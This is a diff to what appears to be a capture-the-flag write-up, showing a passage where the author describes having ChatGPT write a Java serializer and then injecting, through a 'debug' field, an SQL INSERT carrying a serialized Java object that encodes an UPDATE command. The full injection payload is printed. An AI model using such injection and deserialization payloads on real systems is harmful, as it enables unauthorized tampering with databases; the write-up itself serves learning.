@@ -44,7 +44,7 @@ I pasted the string I found in `satellite_query` as well as the java code in [Ch
 
 I prompted ChatGPT to create a java program that would accept a SQL command as input and would use the [Java code I retrieved](Code/SatelliteQueryFileFolderUtility.java) to prepare a hex string that can be fed back to it as an input.  Using [this program](Code/serializer.java) I created a hex string for the SQL command ``UPDATE pointing_mode SET numerical_mode = 1 WHERE Id = 1``.
 I then included the resulting serialized hex in a SQL command to add it as a new entry in `satellite_query` and I pasted this into the `debug` field similarly to how I exfiltrated the database info earlier:
-```
+```sql
 ; INSERT INTO satellite_query (jid, object)
 VALUES (2, 0xaced00057372001f536174656c6c697465517565727946696c65466f6c6465725574696c69747912d4f68d0eb392cb0200035a0007697351756572795a000869735570646174654c000f706174684f7253746174656d656e747400124c6a6176612f6c616e672f537472696e673b7870010174003855504441544520706f696e74696e675f6d6f646520534554206e756d65726963616c5f6d6f6465203d2031205748455245204964203d2031);
 ```
